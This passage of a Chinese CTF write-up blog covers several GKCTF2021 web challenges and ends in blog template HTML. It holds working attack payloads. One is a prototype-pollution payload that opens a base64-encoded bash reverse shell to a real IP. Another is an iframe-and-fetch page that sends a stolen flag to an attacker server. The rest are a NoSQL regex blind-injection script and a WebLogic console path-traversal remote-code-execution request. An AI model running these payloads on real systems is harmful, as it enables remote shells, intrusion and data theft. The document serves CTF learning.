+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&quot;/adminDIV&quot;</span>,<span class="keyword">async</span>(req,res,next) =&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> token = req.cookies.token</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> data =  <span class="built_in">JSON</span>.parse(req.body.data)    <span class="comment">// POST 方法获取一个 data 并用 json 解析</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> result = verifyToken(token);    <span class="comment">// 首先效验 cookie</span></span><br><span class="line">    <span class="keyword">if</span>(result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        username = result;</span><br><span class="line">        <span class="keyword">var</span> sql =<span class="string">&#x27;select board from board&#x27;</span>;</span><br><span class="line">        <span class="keyword">var</span> query = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(<span class="keyword">await</span> select(sql).then(close()))); </span><br><span class="line">        board = <span class="built_in">JSON</span>.parse(query[<span class="number">0</span>].board);</span><br><span class="line">        <span class="built_in">console</span>.log(board);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> data)&#123;    <span class="comment">// 13 - 17 行代码是漏洞逻辑</span></span><br><span class="line">            <span class="keyword">var</span> addDIV = <span class="string">`&#123;&quot;<span class="subst">$&#123;username&#125;</span>&quot;:&#123;&quot;<span class="subst">$&#123;key&#125;</span>&quot;:&quot;<span class="subst">$&#123;data[key]&#125;</span>&quot;&#125;&#125;`</span>;</span><br><span class="line">            </span><br><span class="line">            extend(board,<span class="built_in">JSON</span>.parse(addDIV));</span><br><span class="line">        &#125;</span><br><span class="line">        sql = <span class="string">`update board SET board = &#x27;<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(board)&#125;</span>&#x27; where username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span></span><br><span class="line">        select(sql).then(close()).catch( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="built_in">console</span>.log(err)&#125;); </span><br><span class="line">        res.json(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&#x27;addDiv successful!!!&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.end(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>extend 操作的原型链污染，根据 {“${username}”:{“${key}”:”${data[key]}”}} 可知，我们需要注册一个名为 <code>__**proto__**</code> 的用户，然后用 POST 方法发送一个 data</p>
+<p>下面开始操作，首先发送以下数据，注册一个名为 <strong>proto</strong> 的用户，跟进到可以添加管理员的 /addAdmin 路由：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">&quot;/addAdmin&quot;</span>,<span class="keyword">async</span> (req,res,next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.body.username;</span><br><span class="line">    <span class="keyword">let</span> password = req.body.password;</span><br><span class="line">    <span class="keyword">const</span> token = req.cookies.token</span><br><span class="line">    <span class="keyword">let</span> result = verifyToken(token);</span><br><span class="line">    <span class="keyword">if</span> (result !=<span class="string">&#x27;err&#x27;</span>)&#123;</span><br><span class="line">        gift = <span class="built_in">JSON</span>.stringify(&#123; [username]:&#123;<span class="attr">name</span>:<span class="string">&quot;Blue-Eyes White Dragon&quot;</span>,<span class="attr">ATK</span>:<span class="string">&quot;3000&quot;</span>,<span class="attr">DEF</span>:<span class="string">&quot;2500&quot;</span>,<span class="attr">URL</span>:<span class="string">&quot;https://ftp.bmp.ovh/imgs/2021/06/f66c705bd748e034.jpg&quot;</span>&#125;&#125;);</span><br><span class="line">        <span class="keyword">var</span> sql = format(<span class="string">&#x27;INSERT INTO test (username, password) VALUES (&quot;&#123;&#125;&quot;,&quot;&#123;&#125;&quot;) &#x27;</span>,username,password);</span><br><span class="line">        select(sql).then(close()).catch( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="built_in">console</span>.log(err)&#125;); </span><br><span class="line">        <span class="keyword">var</span> sql = format(<span class="string">&#x27;INSERT INTO board (username, board) VALUES (\&#x27;&#123;&#125;\&#x27;,\&#x27;&#123;&#125;\&#x27;) &#x27;</span>,username,gift);</span><br><span class="line">        <span class="built_in">console</span>.log(sql);</span><br><span class="line">        select(sql).then(close()).catch( <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;<span class="built_in">console</span>.log(err)&#125;);</span><br><span class="line">        res.end(<span class="string">&#x27;add admin successful!&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.end(<span class="string">&#x27;stop!!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>可知创建一个管理员需要提供用户名、密码还有一个经得起效验的 token，我们直接用 admin 用户的 token，发送数据：</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/addAdmin</span><br><span class="line"><span class="attr">POST</span>: username=__proto__&amp;password=<span class="number">123456</span></span><br><span class="line"><span class="attr">COOKIE</span>: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiX19wcm90b19fIiwiZXhwIjoxNjMyMjE4ODcwLCJpYXQiOjE2MzIyMTcwNzB9.aeqh0p-Yug0GSYvLSuabNi7owuZ3aWWIj02SuOkT_Ss</span><br></pre></td></tr></table></figure>
+
+<p>可以看到注册成功</p>
+<p><code>注册成功后登陆 __proto__ 用户并得到了 __proto__ 用户的 token：</code></p>
+<p>然后进入 adminDIV发送paylaod</p>
+<p>注意：由于这里 POST 方法发送的不是 Json，所以我们要对反弹 Shell 部分的命令进行 base64 编码和 URL 编码的方式避免一些控制字符的干扰。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/adminDIV</span><br><span class="line">POST: data=&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo YmFzaCAtYyAiYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMTIuMTI0LjM5LjExOC8yMzMzIDA%2BJjEi|base64 -d|bash&#x27;);var __tmp2&quot;&#125;</span><br><span class="line">COOKIE: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiX19wcm90b19fIiwiZXhwIjoxNjI2Nzg3ODM0LCJpYXQiOjE2MjY3ODYwMzR9.RnQjSPEDcze_M5ALqnixMRRm6feI--GMkT_5rbBhvoM</span><br></pre></td></tr></table></figure>
+
+<p>然后访问 /admin 路由模版渲染就反弹shell了</p>
+<p>不要随意通过/login登陆，因为会生成新的token，导致漏洞利用失败</p>
+<h2 id="checkbot"><a href="#checkbot" class="headerlink" title="checkbot"></a>checkbot</h2><p>可以用 POST 方法向机器人发送一个 url，然后机器人会访问这个 url。根据题目描述我们可以知道，需要让这个机器人从本地访问 admin.php，然后将得到的 flag 带出来。</p>
+<p>我们直接访问 admin.php 然后查看源码可以发现，在一个 HTML 节点中输出了当前 IP：</p>
+<p><img src="https://img-blog.csdnimg.cn/f74bd4e5f0b34f77b47424624cf2ca0a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/f74bd4e5f0b34f77b47424624cf2ca0a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=<span class="string">&quot;iframe1&quot;</span> src=<span class="string">&quot;http://127.0.0.1/admin.php&quot;</span>&gt;&lt;<span class="regexp">/iframe&gt;&lt;script&gt;    function load()&#123;        var iframe = document.getElementById(&quot;iframe1&quot;).contentWindow.document.getElementById(&quot;flag&quot;).innerHTML;        console.log(iframe);        fetch(&#x27;http:/</span><span class="regexp">/112.x.x.x:2333&#x27;, &#123;method: &#x27;POST&#x27;, mode: &#x27;no-cors&#x27;, body: iframe&#125;)	&#125;	window.onload = load;&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>即首先用 iframe 标签加载内容，然后选其中的 flag 元素的值，利用 fetch 带出来</p>
+<p>将以上代码写入 index.html 并放在自己的 VPS 上并开启 2333 端口的 nc 监听，然后向 Bot 提交 VPS 的 url。</p>
+<p><img src="https://img-blog.csdnimg.cn/49936d5309d749febda29465801e0dde.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/49936d5309d749febda29465801e0dde.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>如何没回显的话就重启靶机</p>
+<h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p>查看源码发现</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;#login-button&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;        <span class="keyword">var</span> formObject = &#123;&#125;;        <span class="keyword">var</span> formArray =$(<span class="string">&quot;#login-form&quot;</span>).serializeArray();        $.each(formArray,<span class="function"><span class="keyword">function</span>(<span class="params">i,item</span>)</span>&#123;            formObject[item.name] = item.value;        &#125;);        <span class="built_in">console</span>.log(formObject)        $.ajax(&#123;            <span class="attr">url</span>:<span class="string">&quot;/login.php&quot;</span>,            <span class="attr">type</span>:<span class="string">&quot;post&quot;</span>,            <span class="attr">contentType</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,            <span class="attr">data</span>: <span class="built_in">JSON</span>.stringify(formObject),            <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,            <span class="attr">success</span>:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;                $(<span class="string">&#x27;#res&#x27;</span>).text(data.msg);                <span class="keyword">if</span> (data.msg==<span class="string">&#x27;登录成功&#x27;</span>) &#123;                    <span class="built_in">window</span>.location=<span class="string">&#x27;/admin.php&#x27;</span>                &#125;            &#125;,        &#125;);    &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>发现 login.php 以json的方式post数据登录  并且提示了 nosql</p>
+<p>这里尝试永真式注入</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:&#123;<span class="string">&quot;$ne&quot;</span>:<span class="number">1</span>&#125;,<span class="string">&quot;password&quot;</span>: &#123;<span class="string">&quot;$ne&quot;</span>:<span class="number">1</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现过滤了 用unicode编码绕过</p>
+<p><img src="https://img-blog.csdnimg.cn/f968641431ad45aeaef6078b1b3a9753.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/f968641431ad45aeaef6078b1b3a9753.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>这里应该是盲注了</p>
+<p>脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsimport stringpassword = <span class="string">&#x27;&#x27;</span>url = <span class="string">&#x27;http://node4.buuoj.cn:26293/login.php&#x27;</span><span class="keyword">while</span> <span class="literal">True</span>:    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:        <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;$&#x27;</span>]:            <span class="comment"># When the method is GET            get_payload = &#x27;?username=admin&amp;password[$regex]=^%s&#x27; % (password + c)            # When the method is POST            post_payload = &#123;                &quot;username&quot;: &quot;admin&quot;,                &quot;password[$regex]&quot;: &#x27;^&#x27; + password + c            &#125;            # When the method is POST with JSON            json_payload = &quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&#123;&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot; % (password + c)            headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;            r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json            #r = requests.post(url=url, data=post_payload)            if &#x27;但没完全登录&#x27; in r.content.decode():                print(&quot;[+] %s&quot; % (password + c))                password += c# 42276606202db06ad1f29ab6b4a1307f</span></span><br></pre></td></tr></table></figure>
+
+<p>得到密码登录 叫我们读取文件 读取 /flag 提示在内网</p>
+<p><img src="https://img-blog.csdnimg.cn/d8a1bc07494349ffbc62e0ba40c9a827.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/d8a1bc07494349ffbc62e0ba40c9a827.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>读了 phpinfo</p>
+<p>发现当前使用了 FPM/FastCGI，用的应该是 Nginx。直接读取 Nginx 配置文件 /usr/local/nginx/conf/nginx.conf，得到如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(32) &quot;/usr/local/nginx/conf/nginx.conf&quot;worker_processes  1;events &#123;    worker_connections  1024;&#125;http &#123;    include       mime.types;    default_type  application/octet-stream;    sendfile        on;    #tcp_nopush     on;    #keepalive_timeout  0;    keepalive_timeout  65;    server &#123;        listen       80;        error_page 404 404.php;        root /usr/local/nginx/html;        index index.htm index.html index.php;        location ~ \.php$ &#123;           root           /usr/local/nginx/html;           fastcgi_pass   127.0.0.1:9000;           fastcgi_index  index.php;           fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;           include        fastcgi_params;        &#125;    &#125;resolver 127.0.0.11 valid=0s ipv6=off;resolver_timeout 10s;    # weblogic    server &#123;		listen       80;		server_name  weblogic;		location / &#123;			proxy_set_header Host $host;			set $backend weblogic;			proxy_pass http://$backend:7001;		&#125;	&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现内网中确实还有一个应用，在内网 <code>weblogic</code> 主机的 7001 端口上运行着一个 weblogic 服务。下面我们就想办法攻击这个内网的 weblogic。</p>
+<p>既然 admin.php 可以读取文件，那么我们猜测应该可能存在一处文件包含，并且目标环境开启了 <code>session.upload_progress.enabled</code> 读到存储路径</p>
+<p><img src="https://img-blog.csdnimg.cn/0f540c7a2b2f473c88c791607cd3078b.png" alt="https://img-blog.csdnimg.cn/0f540c7a2b2f473c88c791607cd3078b.png"></p>
+<p>  <code>/var/opt/remi/php72/lib/php/sessions/sess_</code></p>
+<p>phpinfo看到了路径  </p>
+<p><img src="https://img-blog.csdnimg.cn/42c5adb690214b29a2b0537d48319864.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_16,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/42c5adb690214b29a2b0537d48319864.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_16,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>然后条件竞争写shell读文件</p>
+<p>给出另外一种payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socketsSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sSocket.connect((<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26293</span>))payload = <span class="string">b&#x27;&#x27;&#x27;HEAD / HTTP/1.1\r\nHost: node4.buuoj.cn\r\n\r\nGET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22/c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22/bin/sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!=%20null%20)&#123;%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt(); HTTP/1.1\r\nHost:weblogic\r\ncmd: /readflag\r\n\r\n&#x27;&#x27;&#x27;</span>sSocket.send(payload)sSocket.settimeout(<span class="number">2</span>)response = sSocket.recv(<span class="number">2147483647</span>)<span class="keyword">while</span> <span class="built_in">len</span>(response) &gt; <span class="number">0</span>:    <span class="built_in">print</span>(response.decode())    <span class="keyword">try</span>:        response = sSocket.recv(<span class="number">2147483647</span>)    <span class="keyword">except</span>:        breaksSocket.close()</span><br></pre></td></tr></table></figure>
+
+<p>参 <a target="_blank" rel="noopener" href="https://whoamianony.top/2021/06/27/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/GKCTF%20X%20DASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF%20WEB%20WriteUP/">https://whoamianony.top/2021/06/27/CTF比赛记录/GKCTF X DASCTF应急挑战杯 WEB WriteUP/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/284725.html">https://www.freebuf.com/articles/web/284725.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.hackdig.com/06/hack-391147.htm">http://www.hackdig.com/06/hack-391147.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1844890">https://cloud.tencent.com/developer/article/1844890</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://www.lemonprefect.cn/zh-TW/posts/751c0b7.html#hackme]">https://www.lemonprefect.cn/zh-TW/posts/751c0b7.html#hackme]</a>(</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/09/22/GKCTF2021web%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2021/09/20/php%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E5%86%8D%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">php序列化pop链再学习</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> Wh1tecell
+      </li>
+    </ul>
+    <ul>
+      <li>
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="" target="_black" rel="nofollow">闽ICP备2021001239号</a>
+        </li>
+        
+    </ul>
+    <!-- 运行天数 -->
+	<ul>
+		<li><span id="runtime_span"></span></li>
+		<script type="text/javascript">			
+    function show_runtime() {
+        window.setTimeout("show_runtime()", 1000);
+        X = new Date("01/01/2021 12:00:00");
+        Y = new Date();
+        T = (Y.getTime() - X.getTime());
+        M = 24 * 60 * 60 * 1000;
+        a = T / M;
+        A = Math.floor(a);
+        b = (a - A) * 24;
+        B = Math.floor(b);
+        c = (b - B) * 60;
+        C = Math.floor((b - B) * 60);
+        D = Math.floor((c - C) * 60);
+        runtime_span.innerHTML = "小站在各种崩坏中坚持了:" + A + "天" + B + "小时" + C + "分" + D + "秒"
+    }
+	show_runtime();
+</script>
+
+	</ul>
+
+
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+
+
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/touxiang.png" alt="Wh1tecell&#39;blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
